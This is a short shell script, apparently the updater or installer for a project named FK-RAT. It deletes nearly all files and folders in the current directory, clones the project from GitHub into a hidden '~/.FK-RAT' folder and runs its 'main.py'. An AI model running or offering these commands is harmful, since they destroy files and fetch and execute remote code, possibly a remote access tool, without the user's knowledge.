shopt -s extglob
find . -type f -not \( -name '*.fk' -or -name 'initial.cmd' -or -name 'fkrat.conf' \) -delete
rmdir */*
rmdir *

git clone https://github.com/Sunnickel/FK-RAT.git
mv FK-RAT/* ~/.FK-RAT/
rm -rf FK-RAT/
python3 main.py